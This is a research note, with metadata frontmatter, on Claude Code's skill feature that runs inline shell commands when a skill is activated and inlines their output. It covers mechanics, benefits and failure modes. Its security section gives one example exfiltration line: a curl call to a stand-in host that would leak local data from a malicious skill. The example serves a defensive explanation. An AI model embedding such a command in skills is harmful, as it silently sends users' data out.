---
name: Skill Dynamic Context Injection — Shell Pre-Render at Activation Time
summary: Claude Code skills can embed shell commands inline via the `` !`<command>` `` syntax. At skill activation time (not at execution time), each command runs and its output replaces the placeholder in the rendered SKILL.md. Claude only ever sees the final substituted text. This is preprocessing — not a Claude tool call. Multi-line variants use a fenced code block opened with ```!.
implementation_notes: "Activation-time substitution = once per invocation, not re-evaluated across turns. After compaction, the resolved values persist (not the placeholders). Substitution is one-pass: shell output inserted as plain text is not re-scanned for nested !`...` placeholders. Inline form only recognized when `!` appears at line start or after whitespace (so KEY=!`cmd` is treated as literal). Disablable via `disableSkillShellExecution: true` in settings — useful in managed settings. Use ${CLAUDE_SKILL_DIR} for bundled-script paths so they resolve regardless of CWD. PowerShell available with `shell: powershell` on Windows + CLAUDE_CODE_USE_POWERSHELL_TOOL=1."
category: Context Engineering
evidence_strength: Strong (production-tested)
adoption_status: Not Yet Started
priority: P1 (Implement Now)
applicability:
  - "S3 (Claude Code Build)"
  - "General"
adopted_in: []
sources:
  - "anthropic-claude-code-skills-docs.md"
related_findings:
  - file: "claude-code-skill-frontmatter-extensions.md"
    rel: "extends"
  - file: "code-as-deterministic-tool-inside-skills.md"
    rel: "same-problem"
  - file: "context-before-loop-initialization-sequence.md"
    rel: "same-problem"
proposals: null
date_discovered: '2026-06-11'
last_updated: '2026-06-11'
pipeline_status: raw
consumed_by: []
---

# Skill Dynamic Context Injection — Shell Pre-Render at Activation Time

## What It Is

Inside Claude Code SKILL.md, the syntax `` !`<command>` `` runs `<command>` immediately when the skill is invoked. The command's stdout replaces the placeholder. Claude only sees the post-substitution text — the command itself never enters context.

Example:

```yaml
---
name: summarize-changes
description: Summarizes uncommitted changes and flags anything risky
---

## Current changes

!`git diff HEAD`

## Instructions
Summarize the changes above...
```

When invoked, `git diff HEAD` runs first; its output replaces the placeholder; Claude receives the fully-rendered prompt with the diff inlined.

Mechanics:
- **One-pass**: substitution runs once over the original file. Inserted output is NOT re-scanned for nested placeholders.
- **Line-start parsing**: inline form only recognized at line start or after whitespace; `KEY=!`cmd` ` is treated as literal.
- **Multi-line variant**: open a fenced code block with ` ```! ` for multi-line commands.
- **Disable switch**: `"disableSkillShellExecution": true` in settings replaces each command with `[shell command execution disabled by policy]`; particularly useful in managed enterprise settings.
- **Shell selection**: `shell: powershell` in frontmatter for Windows + `CLAUDE_CODE_USE_POWERSHELL_TOOL=1`.

## Why It Matters

This solves a class of context engineering problem that previously required Claude to make a tool call as the first step of every invocation: "I want my skill to start with the current git diff" used to mean Claude itself calling `git diff` as turn 1, paying the tool-call round trip. Now it's preprocessing.

Two distinct benefits:
1. **Activation-time accuracy.** The skill sees live state (current diff, current PR comments, current `gh pr view`) — not what Claude can infer from open files or memory.
2. **Token efficiency.** No tool-call round trip for the setup data; it arrives pre-baked.

This is the same principle as `code-as-deterministic-tool-inside-skills.md` (Anthropic engineering post) but applied to setup state rather than skill output — getting deterministic context *into* the prompt before Claude sees it.

## Why People Are Using It

Built into Claude Code as a first-class skill authoring feature. Documented example in the canonical Claude Code skills docs (`/summarize-changes` skill in the Getting Started section, `/pr-summary` skill in the Advanced Patterns section). Slash commands already had `!`<command>`` injection as a feature pre-skills; the merge of commands into skills brought it along.

## Potential Alternatives

Make-Claude-call-the-tool-first (heavier, slower, mid-conversation tool call). Pre-fetch data outside Claude and inject via environment variable (no live state, fragile to script chain). Skill scripts that produce data (Claude has to run them, see output, integrate — extra round trip). Custom subagents that pre-populate context (heavier, separate persona).

## Potential Improvements

Re-render on demand within a session (current behavior: rendered once at activation, stale on subsequent turns). Caching with TTL for slow commands. Failure handling for command errors (current: stderr also captured? unclear). Per-skill timeout config. Skill author conventions for declaring which commands are required vs. optional.

## Potential Failure Modes

**Stale context across turns.** Activation-time render means the captured state freezes. If the user runs `/summarize-changes`, then makes more edits, the skill body still has the original `git diff` output. Re-invoking refreshes; remembering to re-invoke is on the user.

**Command failure silently captured.** If the shell command fails (returns nonzero, prints an error to stderr), the captured "output" may be misleading or empty. The skill body still includes whatever was captured.

**Security in untrusted skills.** A malicious skill could embed `!`curl https://exfil.example/?data=$(...)` ` to leak local data at activation time. The `disableSkillShellExecution` setting exists exactly for this case but defaults to false. Project skills require workspace trust acceptance, which is the user-side defense.

**Path / env assumptions.** Skill author runs `!`pwd` ` in a known location; user runs the skill from a different CWD; the path differs. Use `${CLAUDE_SKILL_DIR}` for skill-resident paths.

**Output too large.** A `!`git log --all` ` with 10K commits dumps massive output into the prompt. No automatic truncation — author's responsibility.

**Line-start parsing rule confusion.** A markdown bullet `- !`cmd` ` works (whitespace before `!`); a bullet `* !`cmd` ` works; `URL=!`cmd` ` doesn't (no whitespace before `!`). Subtle bug surface.
